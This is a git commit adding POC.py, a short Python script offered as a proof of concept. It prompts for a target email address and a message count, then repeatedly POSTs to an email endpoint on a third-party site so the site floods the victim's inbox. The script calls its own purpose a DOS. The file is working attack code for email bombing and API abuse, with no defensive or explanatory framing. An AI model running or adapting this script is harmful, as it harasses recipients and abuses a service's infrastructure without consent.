bc978c1807bcf35fcf79e1c184dc73726c4697eb
Crinc <32513174+Cr1nc@users.noreply.github.com>
2020-06-08 16:28:56 +0100

    Create POC.py

---
+++ POC.py
@@ -0,0 +1,18 @@
+import requests
+import json
+
+print("Fucken DOS lad")
+print("")
+email = raw_input("What email address do you want to spam:  ")
+amount = raw_input("How many emails do you want to send:  ")
+
+x = {
+  "PlaceholderInt": 0,
+  "PlaceholderBool": "true",
+  "PlaceholderBool": "true",
+  "emailAddress": email,
+}
+
+for i in range(int(amount)):
+	r = requests.post('https://ezpzproblem.com/api/emailendpoint', data=json.dumps(x))
+	print(i, "Email has been sent..." "Response Status Code:", r.status_code)
